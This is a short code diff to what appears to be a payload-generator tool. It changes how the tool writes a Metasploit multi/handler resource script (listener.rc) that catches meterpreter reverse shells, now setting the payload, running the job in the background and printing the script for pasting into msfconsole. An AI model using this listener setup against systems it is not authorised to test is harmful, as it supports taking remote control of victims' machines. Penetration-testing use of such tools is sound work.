@@ -161,14 +161,19 @@ def generate_payload(params,number,avail_payloads):
     else:
     # For reverse shell
         if 'meterpreter' in payload : # meterpreter shells
-            msf_cmd ='''use multi/handler
+            msf_cmd ='''
+            use multi/handler
+            set payload {}
             set LHOST {}
             set LPORT {}
-            run'''.format(IP,PORT)
+            run -j
+            '''.format(payload_cmd,IP,PORT)
             with open("listener.rc","w") as f:
                 f.write(msf_cmd)
             
             print(Green("[+] Saved Listener for later use as listener.rc"))
+            print(Green("[+]   if Msfconsole already open, paste:"))
+            print(Green("{}".format(msf_cmd)))
             print(Green("[*] Launching Metasploit ..."))
             # Launch metasploit in another terminal
             # works only in Kali OR OS with Qterminal
